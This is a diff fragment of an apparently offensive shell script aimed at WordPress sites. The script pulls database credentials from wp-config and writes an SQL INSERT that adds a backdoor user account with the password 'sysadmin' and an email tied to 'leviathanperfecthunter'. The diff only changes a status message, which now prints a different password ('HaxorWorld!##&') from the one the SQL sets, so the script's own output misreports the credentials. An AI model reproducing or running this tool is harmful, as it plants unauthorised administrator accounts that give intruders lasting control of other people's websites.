@@ -26,7 +26,7 @@ echo " "
 echo -e "$cyan[+]$okegreen Getting Config From $wpconf"
 echo -e "$cyan[*]$okegreen dbname: $dbname|dbuser: $dbuser|dbpassword: $dbpass |table_prefix: $prefix"
 sleep 2
-echo -e "$cyan[+]$yellow Trying Added Username and Password:$okegreen $username $cyan|$okegreen sysadmin"
+echo -e "$cyan[+]$yellow Trying Added Username and Password:$okegreen $username $cyan|$okegreen HaxorWorld!##&"
 
 # addUser
 echo "INSERT INTO \`${prefix}users\` (\`ID\`, \`user_login\`, \`user_pass\`, \`user_nicename\`, \`user_email\`, \`user_url\`, \`user_registered\`, \`user_activation_key\`, \`user_status\`, \`display_name\`) VALUES (null, '$username', MD5('sysadmin'), 'sysadmin', 'leviathanperfecthunter@gmail.com','https://leviathanperfecthunter.com/', '2018-04-17 00:00:00', '', '0', 'Ad');" > s.sql
